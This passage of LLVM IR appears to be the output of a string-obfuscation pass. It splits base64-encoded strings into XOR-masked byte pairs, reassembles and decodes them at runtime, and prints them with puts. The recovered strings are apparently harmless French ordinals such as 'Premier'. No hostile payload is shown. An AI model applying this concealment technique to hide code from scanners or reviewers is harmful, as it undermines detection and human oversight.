  %sp0.69 = bitcast [17 x i8]* %sp69 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\64", [1 x i8]* %sp0.69
  %sp0.208 = alloca [1 x i8]
  store [1 x i8] c"\01", [1 x i8]* %sp0.208
  %sp0.1.208 = bitcast [1 x i8]* %sp0.208 to i8*
  %i0.208 = load i8, i8* %sp0.1.208

  %sp1.208 = alloca [1 x i8]
  store [1 x i8] c"\65", [1 x i8]* %sp1.208
  %sp1.1.208 = bitcast [1 x i8]* %sp1.208 to i8*
  %i1.208 = load i8, i8* %sp1.1.208

  %xp208 = xor i8 %i0.208, %i1.208

  %fi.208 = alloca i8
  store i8 %xp208, i8* %fi.208

  %final.ptr.208 = bitcast i8* %fi.208 to [1 x i8]*
  %spi208 = load [1 x i8], [1 x i8]* %final.ptr.208
  store [1 x i8] %spi208, [1 x i8]* %sp0.69
;-------------------------------
  %next0.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 1
  
  %sp1.69 = bitcast i8* %next0.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\48\4a", [2 x i8]* %sp1.69
  %sp0.209 = alloca [2 x i8]
  store [2 x i8] c"\3C\01", [2 x i8]* %sp0.209
  %sp0.1.209 = bitcast [2 x i8]* %sp0.209 to i16*
  %i0.209 = load i16, i16* %sp0.1.209

  %sp1.209 = alloca [2 x i8]
  store [2 x i8] c"\74\4b", [2 x i8]* %sp1.209
  %sp1.1.209 = bitcast [2 x i8]* %sp1.209 to i16*
  %i1.209 = load i16, i16* %sp1.1.209

  %xp209 = xor i16 %i0.209, %i1.209

  %fi.209 = alloca i16
  store i16 %xp209, i16* %fi.209

  %final.ptr.209 = bitcast i16* %fi.209 to [2 x i8]*
  %spi209 = load [2 x i8], [2 x i8]* %final.ptr.209
  store [2 x i8] %spi209, [2 x i8]* %sp1.69
;-------------------------------
  %next1.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 3
  
  %sp2.69 = bitcast i8* %next1.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\76\61", [2 x i8]* %sp2.69
  %sp0.210 = alloca [2 x i8]
  store [2 x i8] c"\4E\27", [2 x i8]* %sp0.210
  %sp0.1.210 = bitcast [2 x i8]* %sp0.210 to i16*
  %i0.210 = load i16, i16* %sp0.1.210

  %sp1.210 = alloca [2 x i8]
  store [2 x i8] c"\38\46", [2 x i8]* %sp1.210
  %sp1.1.210 = bitcast [2 x i8]* %sp1.210 to i16*
  %i1.210 = load i16, i16* %sp1.1.210

  %xp210 = xor i16 %i0.210, %i1.210

  %fi.210 = alloca i16
  store i16 %xp210, i16* %fi.210

  %final.ptr.210 = bitcast i16* %fi.210 to [2 x i8]*
  %spi210 = load [2 x i8], [2 x i8]* %final.ptr.210
  store [2 x i8] %spi210, [2 x i8]* %sp2.69
;-------------------------------
  %next2.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 5
  
  %sp3.69 = bitcast i8* %next2.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\58\4e", [2 x i8]* %sp3.69
  %sp0.211 = alloca [2 x i8]
  store [2 x i8] c"\10\7A", [2 x i8]* %sp0.211
  %sp0.1.211 = bitcast [2 x i8]* %sp0.211 to i16*
  %i0.211 = load i16, i16* %sp0.1.211

  %sp1.211 = alloca [2 x i8]
  store [2 x i8] c"\48\34", [2 x i8]* %sp1.211
  %sp1.1.211 = bitcast [2 x i8]* %sp1.211 to i16*
  %i1.211 = load i16, i16* %sp1.1.211

  %xp211 = xor i16 %i0.211, %i1.211

  %fi.211 = alloca i16
  store i16 %xp211, i16* %fi.211

  %final.ptr.211 = bitcast i16* %fi.211 to [2 x i8]*
  %spi211 = load [2 x i8], [2 x i8]* %final.ptr.211
  store [2 x i8] %spi211, [2 x i8]* %sp3.69
;-------------------------------
  %next3.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 7
  
  %sp4.69 = bitcast i8* %next3.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\70\5a", [2 x i8]* %sp4.69
  %sp0.212 = alloca [2 x i8]
  store [2 x i8] c"\38\62", [2 x i8]* %sp0.212
  %sp0.1.212 = bitcast [2 x i8]* %sp0.212 to i16*
  %i0.212 = load i16, i16* %sp0.1.212

  %sp1.212 = alloca [2 x i8]
  store [2 x i8] c"\48\38", [2 x i8]* %sp1.212
  %sp1.1.212 = bitcast [2 x i8]* %sp1.212 to i16*
  %i1.212 = load i16, i16* %sp1.1.212

  %xp212 = xor i16 %i0.212, %i1.212

  %fi.212 = alloca i16
  store i16 %xp212, i16* %fi.212

  %final.ptr.212 = bitcast i16* %fi.212 to [2 x i8]*
  %spi212 = load [2 x i8], [2 x i8]* %final.ptr.212
  store [2 x i8] %spi212, [2 x i8]* %sp4.69
;-------------------------------
  %next4.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 9
  
  %sp5.69 = bitcast i8* %next4.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\31", [2 x i8]* %sp5.69
  %sp0.213 = alloca [2 x i8]
  store [2 x i8] c"\35\7E", [2 x i8]* %sp0.213
  %sp0.1.213 = bitcast [2 x i8]* %sp0.213 to i16*
  %i0.213 = load i16, i16* %sp0.1.213

  %sp1.213 = alloca [2 x i8]
  store [2 x i8] c"\62\4f", [2 x i8]* %sp1.213
  %sp1.1.213 = bitcast [2 x i8]* %sp1.213 to i16*
  %i1.213 = load i16, i16* %sp1.1.213

  %xp213 = xor i16 %i0.213, %i1.213

  %fi.213 = alloca i16
  store i16 %xp213, i16* %fi.213

  %final.ptr.213 = bitcast i16* %fi.213 to [2 x i8]*
  %spi213 = load [2 x i8], [2 x i8]* %final.ptr.213
  store [2 x i8] %spi213, [2 x i8]* %sp5.69
;-------------------------------
  %next5.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 11
  
  %sp6.69 = bitcast i8* %next5.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\41", [2 x i8]* %sp6.69
  %sp0.214 = alloca [2 x i8]
  store [2 x i8] c"\3A\20", [2 x i8]* %sp0.214
  %sp0.1.214 = bitcast [2 x i8]* %sp0.214 to i16*
  %i0.214 = load i16, i16* %sp0.1.214

  %sp1.214 = alloca [2 x i8]
  store [2 x i8] c"\56\61", [2 x i8]* %sp1.214
  %sp1.1.214 = bitcast [2 x i8]* %sp1.214 to i16*
  %i1.214 = load i16, i16* %sp1.1.214

  %xp214 = xor i16 %i0.214, %i1.214

  %fi.214 = alloca i16
  store i16 %xp214, i16* %fi.214

  %final.ptr.214 = bitcast i16* %fi.214 to [2 x i8]*
  %spi214 = load [2 x i8], [2 x i8]* %final.ptr.214
  store [2 x i8] %spi214, [2 x i8]* %sp6.69
;-------------------------------
  %next6.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 13
  
  %sp7.69 = bitcast i8* %next6.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\3d", [2 x i8]* %sp7.69
  %sp0.215 = alloca [2 x i8]
  store [2 x i8] c"\2E\72", [2 x i8]* %sp0.215
  %sp0.1.215 = bitcast [2 x i8]* %sp0.215 to i16*
  %i0.215 = load i16, i16* %sp0.1.215

  %sp1.215 = alloca [2 x i8]
  store [2 x i8] c"\6f\4f", [2 x i8]* %sp1.215
  %sp1.1.215 = bitcast [2 x i8]* %sp1.215 to i16*
  %i1.215 = load i16, i16* %sp1.1.215

  %xp215 = xor i16 %i0.215, %i1.215

  %fi.215 = alloca i16
  store i16 %xp215, i16* %fi.215

  %final.ptr.215 = bitcast i16* %fi.215 to [2 x i8]*
  %spi215 = load [2 x i8], [2 x i8]* %final.ptr.215
  store [2 x i8] %spi215, [2 x i8]* %sp7.69
;-------------------------------
  %next7.69 = getelementptr [17 x i8], [17 x i8]* %sp69, i32 0, i32 15
  
  %sp8.69 = bitcast i8* %next7.69 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.69
  %sp0.216 = alloca [2 x i8]
  store [2 x i8] c"\4F\4C", [2 x i8]* %sp0.216
  %sp0.1.216 = bitcast [2 x i8]* %sp0.216 to i16*
  %i0.216 = load i16, i16* %sp0.1.216

  %sp1.216 = alloca [2 x i8]
  store [2 x i8] c"\72\4c", [2 x i8]* %sp1.216
  %sp1.1.216 = bitcast [2 x i8]* %sp1.216 to i16*
  %i1.216 = load i16, i16* %sp1.1.216

  %xp216 = xor i16 %i0.216, %i1.216

  %fi.216 = alloca i16
  store i16 %xp216, i16* %fi.216

  %final.ptr.216 = bitcast i16* %fi.216 to [2 x i8]*
  %spi216 = load [2 x i8], [2 x i8]* %final.ptr.216
  store [2 x i8] %spi216, [2 x i8]* %sp8.69
;-------------------------------

  %spi69 = load [17 x i8], [17 x i8]* %sp69
  store [17 x i8] %spi69, [17 x i8]* %cipher.ptr.32
;-------------------------------
  %cipher.32 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.32, i32 0, i32 0
  %plain.ptr.32 = tail call i8* @base64_decode(i8* %cipher.32)
  %spi32 = bitcast i8* %plain.ptr.32 to [10 x i8]*
  %cast10= getelementptr [10 x i8], [10 x i8]* %spi32, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast10)
  br label %next10
BB_12:
;-------------------------------
; Replace: %cast12= getelementptr [8 x i8], [8 x i8]* @.str11, i64 0, i64 0
  %cipher.ptr.33 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\55\48\4a\6c\62\57\6c\6c\63\67\41\3d\00", [13 x i8]* %cipher.ptr.33
  %sp70 = alloca [13 x i8]

  
  %sp0.70 = bitcast [13 x i8]* %sp70 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\55", [1 x i8]* %sp0.70
  %sp0.217 = alloca [1 x i8]
  store [1 x i8] c"\3F", [1 x i8]* %sp0.217
  %sp0.1.217 = bitcast [1 x i8]* %sp0.217 to i8*
  %i0.217 = load i8, i8* %sp0.1.217

  %sp1.217 = alloca [1 x i8]
  store [1 x i8] c"\6a", [1 x i8]* %sp1.217
  %sp1.1.217 = bitcast [1 x i8]* %sp1.217 to i8*
  %i1.217 = load i8, i8* %sp1.1.217

  %xp217 = xor i8 %i0.217, %i1.217

  %fi.217 = alloca i8
  store i8 %xp217, i8* %fi.217

  %final.ptr.217 = bitcast i8* %fi.217 to [1 x i8]*
  %spi217 = load [1 x i8], [1 x i8]* %final.ptr.217
  store [1 x i8] %spi217, [1 x i8]* %sp0.70
;-------------------------------
  %next0.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 1
  
  %sp1.70 = bitcast i8* %next0.70 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\48", [1 x i8]* %sp1.70
  %sp0.218 = alloca [1 x i8]
  store [1 x i8] c"\1A", [1 x i8]* %sp0.218
  %sp0.1.218 = bitcast [1 x i8]* %sp0.218 to i8*
  %i0.218 = load i8, i8* %sp0.1.218

  %sp1.218 = alloca [1 x i8]
  store [1 x i8] c"\52", [1 x i8]* %sp1.218
  %sp1.1.218 = bitcast [1 x i8]* %sp1.218 to i8*
  %i1.218 = load i8, i8* %sp1.1.218

  %xp218 = xor i8 %i0.218, %i1.218

  %fi.218 = alloca i8
  store i8 %xp218, i8* %fi.218

  %final.ptr.218 = bitcast i8* %fi.218 to [1 x i8]*
  %spi218 = load [1 x i8], [1 x i8]* %final.ptr.218
  store [1 x i8] %spi218, [1 x i8]* %sp1.70
;-------------------------------
  %next1.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 2
  
  %sp2.70 = bitcast i8* %next1.70 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\4a\6c", [2 x i8]* %sp2.70
  %sp0.219 = alloca [2 x i8]
  store [2 x i8] c"\3D\0E", [2 x i8]* %sp0.219
  %sp0.1.219 = bitcast [2 x i8]* %sp0.219 to i16*
  %i0.219 = load i16, i16* %sp0.1.219

  %sp1.219 = alloca [2 x i8]
  store [2 x i8] c"\77\62", [2 x i8]* %sp1.219
  %sp1.1.219 = bitcast [2 x i8]* %sp1.219 to i16*
  %i1.219 = load i16, i16* %sp1.1.219

  %xp219 = xor i16 %i0.219, %i1.219

  %fi.219 = alloca i16
  store i16 %xp219, i16* %fi.219

  %final.ptr.219 = bitcast i16* %fi.219 to [2 x i8]*
  %spi219 = load [2 x i8], [2 x i8]* %final.ptr.219
  store [2 x i8] %spi219, [2 x i8]* %sp2.70
;-------------------------------
  %next2.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 4
  
  %sp3.70 = bitcast i8* %next2.70 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\62", [1 x i8]* %sp3.70
  %sp0.220 = alloca [1 x i8]
  store [1 x i8] c"\5B", [1 x i8]* %sp0.220
  %sp0.1.220 = bitcast [1 x i8]* %sp0.220 to i8*
  %i0.220 = load i8, i8* %sp0.1.220

  %sp1.220 = alloca [1 x i8]
  store [1 x i8] c"\39", [1 x i8]* %sp1.220
  %sp1.1.220 = bitcast [1 x i8]* %sp1.220 to i8*
  %i1.220 = load i8, i8* %sp1.1.220

  %xp220 = xor i8 %i0.220, %i1.220

  %fi.220 = alloca i8
  store i8 %xp220, i8* %fi.220

  %final.ptr.220 = bitcast i8* %fi.220 to [1 x i8]*
  %spi220 = load [1 x i8], [1 x i8]* %final.ptr.220
  store [1 x i8] %spi220, [1 x i8]* %sp3.70
;-------------------------------
  %next3.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 5
  
  %sp4.70 = bitcast i8* %next3.70 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\57\6c", [2 x i8]* %sp4.70
  %sp0.221 = alloca [2 x i8]
  store [2 x i8] c"\21\07", [2 x i8]* %sp0.221
  %sp0.1.221 = bitcast [2 x i8]* %sp0.221 to i16*
  %i0.221 = load i16, i16* %sp0.1.221

  %sp1.221 = alloca [2 x i8]
  store [2 x i8] c"\76\6b", [2 x i8]* %sp1.221
  %sp1.1.221 = bitcast [2 x i8]* %sp1.221 to i16*
  %i1.221 = load i16, i16* %sp1.1.221

  %xp221 = xor i16 %i0.221, %i1.221

  %fi.221 = alloca i16
  store i16 %xp221, i16* %fi.221

  %final.ptr.221 = bitcast i16* %fi.221 to [2 x i8]*
  %spi221 = load [2 x i8], [2 x i8]* %final.ptr.221
  store [2 x i8] %spi221, [2 x i8]* %sp4.70
;-------------------------------
  %next4.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 7
  
  %sp5.70 = bitcast i8* %next4.70 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6c", [1 x i8]* %sp5.70
  %sp0.222 = alloca [1 x i8]
  store [1 x i8] c"\0F", [1 x i8]* %sp0.222
  %sp0.1.222 = bitcast [1 x i8]* %sp0.222 to i8*
  %i0.222 = load i8, i8* %sp0.1.222

  %sp1.222 = alloca [1 x i8]
  store [1 x i8] c"\63", [1 x i8]* %sp1.222
  %sp1.1.222 = bitcast [1 x i8]* %sp1.222 to i8*
  %i1.222 = load i8, i8* %sp1.1.222

  %xp222 = xor i8 %i0.222, %i1.222

  %fi.222 = alloca i8
  store i8 %xp222, i8* %fi.222

  %final.ptr.222 = bitcast i8* %fi.222 to [1 x i8]*
  %spi222 = load [1 x i8], [1 x i8]* %final.ptr.222
  store [1 x i8] %spi222, [1 x i8]* %sp5.70
;-------------------------------
  %next5.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 8
  
  %sp6.70 = bitcast i8* %next5.70 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\63\67", [2 x i8]* %sp6.70
  %sp0.223 = alloca [2 x i8]
  store [2 x i8] c"\2F\13", [2 x i8]* %sp0.223
  %sp0.1.223 = bitcast [2 x i8]* %sp0.223 to i16*
  %i0.223 = load i16, i16* %sp0.1.223

  %sp1.223 = alloca [2 x i8]
  store [2 x i8] c"\4c\74", [2 x i8]* %sp1.223
  %sp1.1.223 = bitcast [2 x i8]* %sp1.223 to i16*
  %i1.223 = load i16, i16* %sp1.1.223

  %xp223 = xor i16 %i0.223, %i1.223

  %fi.223 = alloca i16
  store i16 %xp223, i16* %fi.223

  %final.ptr.223 = bitcast i16* %fi.223 to [2 x i8]*
  %spi223 = load [2 x i8], [2 x i8]* %final.ptr.223
  store [2 x i8] %spi223, [2 x i8]* %sp6.70
;-------------------------------
  %next6.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 10
  
  %sp7.70 = bitcast i8* %next6.70 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp7.70
  %sp0.224 = alloca [1 x i8]
  store [1 x i8] c"\1B", [1 x i8]* %sp0.224
  %sp0.1.224 = bitcast [1 x i8]* %sp0.224 to i8*
  %i0.224 = load i8, i8* %sp0.1.224

  %sp1.224 = alloca [1 x i8]
  store [1 x i8] c"\5a", [1 x i8]* %sp1.224
  %sp1.1.224 = bitcast [1 x i8]* %sp1.224 to i8*
  %i1.224 = load i8, i8* %sp1.1.224

  %xp224 = xor i8 %i0.224, %i1.224

  %fi.224 = alloca i8
  store i8 %xp224, i8* %fi.224

  %final.ptr.224 = bitcast i8* %fi.224 to [1 x i8]*
  %spi224 = load [1 x i8], [1 x i8]* %final.ptr.224
  store [1 x i8] %spi224, [1 x i8]* %sp7.70
;-------------------------------
  %next7.70 = getelementptr [13 x i8], [13 x i8]* %sp70, i32 0, i32 11
  
  %sp8.70 = bitcast i8* %next7.70 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.70
  %sp0.225 = alloca [2 x i8]
  store [2 x i8] c"\73\6F", [2 x i8]* %sp0.225
  %sp0.1.225 = bitcast [2 x i8]* %sp0.225 to i16*
  %i0.225 = load i16, i16* %sp0.1.225

  %sp1.225 = alloca [2 x i8]
  store [2 x i8] c"\4e\6f", [2 x i8]* %sp1.225
  %sp1.1.225 = bitcast [2 x i8]* %sp1.225 to i16*
  %i1.225 = load i16, i16* %sp1.1.225

  %xp225 = xor i16 %i0.225, %i1.225

  %fi.225 = alloca i16
  store i16 %xp225, i16* %fi.225

  %final.ptr.225 = bitcast i16* %fi.225 to [2 x i8]*
  %spi225 = load [2 x i8], [2 x i8]* %final.ptr.225
  store [2 x i8] %spi225, [2 x i8]* %sp8.70
;-------------------------------

  %spi70 = load [13 x i8], [13 x i8]* %sp70
  store [13 x i8] %spi70, [13 x i8]* %cipher.ptr.33
;-------------------------------
  %cipher.33 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.33, i32 0, i32 0
  %plain.ptr.33 = tail call i8* @base64_decode(i8* %cipher.33)
  %spi33 = bitcast i8* %plain.ptr.33 to [8 x i8]*
  %cast12= getelementptr [8 x i8], [8 x i8]* %spi33, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast12)
  br label %next12
BB_14:
;-------------------------------
; Replace: %cast14= getelementptr [9 x i8], [9 x i8]* @.str13, i64 0, i64 0
  %cipher.ptr.34 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\65\6d\56\6d\61\63\53\31\61\48\51\41\00", [13 x i8]* %cipher.ptr.34
  %sp71 = alloca [13 x i8]

  
  %sp0.71 = bitcast [13 x i8]* %sp71 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\65", [1 x i8]* %sp0.71
  %sp0.226 = alloca [1 x i8]
  store [1 x i8] c"\0B", [1 x i8]* %sp0.226
  %sp0.1.226 = bitcast [1 x i8]* %sp0.226 to i8*
  %i0.226 = load i8, i8* %sp0.1.226

  %sp1.226 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.226
  %sp1.1.226 = bitcast [1 x i8]* %sp1.226 to i8*
  %i1.226 = load i8, i8* %sp1.1.226

  %xp226 = xor i8 %i0.226, %i1.226

  %fi.226 = alloca i8
  store i8 %xp226, i8* %fi.226

  %final.ptr.226 = bitcast i8* %fi.226 to [1 x i8]*
  %spi226 = load [1 x i8], [1 x i8]* %final.ptr.226
  store [1 x i8] %spi226, [1 x i8]* %sp0.71
;-------------------------------
  %next0.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 1
  
  %sp1.71 = bitcast i8* %next0.71 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6d", [1 x i8]* %sp1.71
  %sp0.227 = alloca [1 x i8]
  store [1 x i8] c"\22", [1 x i8]* %sp0.227
  %sp0.1.227 = bitcast [1 x i8]* %sp0.227 to i8*
  %i0.227 = load i8, i8* %sp0.1.227

  %sp1.227 = alloca [1 x i8]
  store [1 x i8] c"\4f", [1 x i8]* %sp1.227
  %sp1.1.227 = bitcast [1 x i8]* %sp1.227 to i8*
  %i1.227 = load i8, i8* %sp1.1.227

  %xp227 = xor i8 %i0.227, %i1.227

  %fi.227 = alloca i8
  store i8 %xp227, i8* %fi.227

  %final.ptr.227 = bitcast i8* %fi.227 to [1 x i8]*
  %spi227 = load [1 x i8], [1 x i8]* %final.ptr.227
  store [1 x i8] %spi227, [1 x i8]* %sp1.71
;-------------------------------
  %next1.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 2
  
  %sp2.71 = bitcast i8* %next1.71 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\56\6d", [2 x i8]* %sp2.71
  %sp0.228 = alloca [2 x i8]
  store [2 x i8] c"\1B\1C", [2 x i8]* %sp0.228
  %sp0.1.228 = bitcast [2 x i8]* %sp0.228 to i16*
  %i0.228 = load i16, i16* %sp0.1.228

  %sp1.228 = alloca [2 x i8]
  store [2 x i8] c"\4d\71", [2 x i8]* %sp1.228
  %sp1.1.228 = bitcast [2 x i8]* %sp1.228 to i16*
  %i1.228 = load i16, i16* %sp1.1.228

  %xp228 = xor i16 %i0.228, %i1.228

  %fi.228 = alloca i16
  store i16 %xp228, i16* %fi.228

  %final.ptr.228 = bitcast i16* %fi.228 to [2 x i8]*
  %spi228 = load [2 x i8], [2 x i8]* %final.ptr.228
  store [2 x i8] %spi228, [2 x i8]* %sp2.71
;-------------------------------
  %next2.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 4
  
  %sp3.71 = bitcast i8* %next2.71 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\61", [1 x i8]* %sp3.71
  %sp0.229 = alloca [1 x i8]
  store [1 x i8] c"\0E", [1 x i8]* %sp0.229
  %sp0.1.229 = bitcast [1 x i8]* %sp0.229 to i8*
  %i0.229 = load i8, i8* %sp0.1.229

  %sp1.229 = alloca [1 x i8]
  store [1 x i8] c"\6f", [1 x i8]* %sp1.229
  %sp1.1.229 = bitcast [1 x i8]* %sp1.229 to i8*
  %i1.229 = load i8, i8* %sp1.1.229

  %xp229 = xor i8 %i0.229, %i1.229

  %fi.229 = alloca i8
  store i8 %xp229, i8* %fi.229

  %final.ptr.229 = bitcast i8* %fi.229 to [1 x i8]*
  %spi229 = load [1 x i8], [1 x i8]* %final.ptr.229
  store [1 x i8] %spi229, [1 x i8]* %sp3.71
;-------------------------------
  %next3.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 5
  
  %sp4.71 = bitcast i8* %next3.71 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\63\53", [2 x i8]* %sp4.71
  %sp0.230 = alloca [2 x i8]
  store [2 x i8] c"\27\1E", [2 x i8]* %sp0.230
  %sp0.1.230 = bitcast [2 x i8]* %sp0.230 to i16*
  %i0.230 = load i16, i16* %sp0.1.230

  %sp1.230 = alloca [2 x i8]
  store [2 x i8] c"\44\4d", [2 x i8]* %sp1.230
  %sp1.1.230 = bitcast [2 x i8]* %sp1.230 to i16*
  %i1.230 = load i16, i16* %sp1.1.230

  %xp230 = xor i16 %i0.230, %i1.230

  %fi.230 = alloca i16
  store i16 %xp230, i16* %fi.230

  %final.ptr.230 = bitcast i16* %fi.230 to [2 x i8]*
  %spi230 = load [2 x i8], [2 x i8]* %final.ptr.230
  store [2 x i8] %spi230, [2 x i8]* %sp4.71
;-------------------------------
  %next4.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 7
  
  %sp5.71 = bitcast i8* %next4.71 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\31", [1 x i8]* %sp5.71
  %sp0.231 = alloca [1 x i8]
  store [1 x i8] c"\5D", [1 x i8]* %sp0.231
  %sp0.1.231 = bitcast [1 x i8]* %sp0.231 to i8*
  %i0.231 = load i8, i8* %sp0.1.231

  %sp1.231 = alloca [1 x i8]
  store [1 x i8] c"\6c", [1 x i8]* %sp1.231
  %sp1.1.231 = bitcast [1 x i8]* %sp1.231 to i8*
  %i1.231 = load i8, i8* %sp1.1.231

  %xp231 = xor i8 %i0.231, %i1.231

  %fi.231 = alloca i8
  store i8 %xp231, i8* %fi.231

  %final.ptr.231 = bitcast i8* %fi.231 to [1 x i8]*
  %spi231 = load [1 x i8], [1 x i8]* %final.ptr.231
  store [1 x i8] %spi231, [1 x i8]* %sp5.71
;-------------------------------
  %next5.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 8
  
  %sp6.71 = bitcast i8* %next5.71 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\61\48", [2 x i8]* %sp6.71
  %sp0.232 = alloca [2 x i8]
  store [2 x i8] c"\2A\09", [2 x i8]* %sp0.232
  %sp0.1.232 = bitcast [2 x i8]* %sp0.232 to i16*
  %i0.232 = load i16, i16* %sp0.1.232

  %sp1.232 = alloca [2 x i8]
  store [2 x i8] c"\4b\41", [2 x i8]* %sp1.232
  %sp1.1.232 = bitcast [2 x i8]* %sp1.232 to i16*
  %i1.232 = load i16, i16* %sp1.1.232

  %xp232 = xor i16 %i0.232, %i1.232

  %fi.232 = alloca i16
  store i16 %xp232, i16* %fi.232

  %final.ptr.232 = bitcast i16* %fi.232 to [2 x i8]*
  %spi232 = load [2 x i8], [2 x i8]* %final.ptr.232
  store [2 x i8] %spi232, [2 x i8]* %sp6.71
;-------------------------------
  %next6.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 10
  
  %sp7.71 = bitcast i8* %next6.71 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\51", [1 x i8]* %sp7.71
  %sp0.233 = alloca [1 x i8]
  store [1 x i8] c"\10", [1 x i8]* %sp0.233
  %sp0.1.233 = bitcast [1 x i8]* %sp0.233 to i8*
  %i0.233 = load i8, i8* %sp0.1.233

  %sp1.233 = alloca [1 x i8]
  store [1 x i8] c"\41", [1 x i8]* %sp1.233
  %sp1.1.233 = bitcast [1 x i8]* %sp1.233 to i8*
  %i1.233 = load i8, i8* %sp1.1.233

  %xp233 = xor i8 %i0.233, %i1.233

  %fi.233 = alloca i8
  store i8 %xp233, i8* %fi.233

  %final.ptr.233 = bitcast i8* %fi.233 to [1 x i8]*
  %spi233 = load [1 x i8], [1 x i8]* %final.ptr.233
  store [1 x i8] %spi233, [1 x i8]* %sp7.71
;-------------------------------
  %next7.71 = getelementptr [13 x i8], [13 x i8]* %sp71, i32 0, i32 11
  
  %sp8.71 = bitcast i8* %next7.71 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\00", [2 x i8]* %sp8.71
  %sp0.234 = alloca [2 x i8]
  store [2 x i8] c"\3B\49", [2 x i8]* %sp0.234
  %sp0.1.234 = bitcast [2 x i8]* %sp0.234 to i16*
  %i0.234 = load i16, i16* %sp0.1.234

  %sp1.234 = alloca [2 x i8]
  store [2 x i8] c"\7a\49", [2 x i8]* %sp1.234
  %sp1.1.234 = bitcast [2 x i8]* %sp1.234 to i16*
  %i1.234 = load i16, i16* %sp1.1.234

  %xp234 = xor i16 %i0.234, %i1.234

  %fi.234 = alloca i16
  store i16 %xp234, i16* %fi.234

  %final.ptr.234 = bitcast i16* %fi.234 to [2 x i8]*
  %spi234 = load [2 x i8], [2 x i8]* %final.ptr.234
  store [2 x i8] %spi234, [2 x i8]* %sp8.71
;-------------------------------

  %spi71 = load [13 x i8], [13 x i8]* %sp71
  store [13 x i8] %spi71, [13 x i8]* %cipher.ptr.34
;-------------------------------
  %cipher.34 = getelementptr inbounds [13 x i8], [13 x i8]* %cipher.ptr.34, i32 0, i32 0
  %plain.ptr.34 = tail call i8* @base64_decode(i8* %cipher.34)
  %spi34 = bitcast i8* %plain.ptr.34 to [9 x i8]*
  %cast14= getelementptr [9 x i8], [9 x i8]* %spi34, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast14)
  br label %next14
BB_16:
;-------------------------------
; Replace: %cast16= getelementptr [8 x i8], [8 x i8]* @.str15, i64 0, i64 0
  %cipher.ptr.35 = alloca [13 x i8]
;-------------------------------
; Replace: store [13 x i8] c"\55\48\4a\6c\62\57\6c\6c\63\67\41\3d\00", [13 x i8]* %cipher.ptr.35
  %sp72 = alloca [13 x i8]

  
  %sp0.72 = bitcast [13 x i8]* %sp72 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\55", [1 x i8]* %sp0.72
  %sp0.235 = alloca [1 x i8]
  store [1 x i8] c"\2D", [1 x i8]* %sp0.235
  %sp0.1.235 = bitcast [1 x i8]* %sp0.235 to i8*
  %i0.235 = load i8, i8* %sp0.1.235

  %sp1.235 = alloca [1 x i8]
  store [1 x i8] c"\78", [1 x i8]* %sp1.235
  %sp1.1.235 = bitcast [1 x i8]* %sp1.235 to i8*
  %i1.235 = load i8, i8* %sp1.1.235

